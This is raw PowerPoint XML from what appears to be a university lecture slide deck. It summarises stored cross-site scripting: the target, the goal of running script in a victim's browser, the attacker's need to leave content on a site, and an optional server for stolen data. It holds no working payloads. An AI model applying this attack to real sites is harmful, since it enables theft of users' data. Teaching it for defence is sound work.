              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>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012225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39228" y="717176"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="439081" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="-4" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-287" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-22" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-13" dirty="0"/>
              <a:t>Summary</a:t>
            </a:r>
            <a:endParaRPr sz="5383" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2074489"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599765" y="2022662"/>
            <a:ext cx="6852397" cy="666849"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:lnSpc>
                <a:spcPts val="2577"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="-35" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Target</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>User with </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="22" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Javascript-enabled </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="9" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>browser </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>who</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>visits</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11185">
              <a:lnSpc>
                <a:spcPts val="2577"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" i="1" spc="4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>user-influenced </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="13" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>content </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>on a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>vulnerable </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="49" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="3036794"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166918" name="object 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="3000376"/>
            <a:ext cx="7230596" cy="6668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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="2559"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attack goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Run script in user’s browser with same access  as provided to server’s regular scripts (i.e., subvert SOP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="3997698"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166920" name="object 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="3973887"/>
            <a:ext cx="7087721" cy="641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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="2471"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attacker needs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Ability to leave content on the web server  (forums, comments, custom profiles)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="4754095"/>
            <a:ext cx="126066" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2902324" y="4700868"/>
            <a:ext cx="6660497" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Optional: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>a server </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>receiving </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>stolen user</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>information</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="5395632"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166924" name="object 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="5374622"/>
            <a:ext cx="7753070" cy="641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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
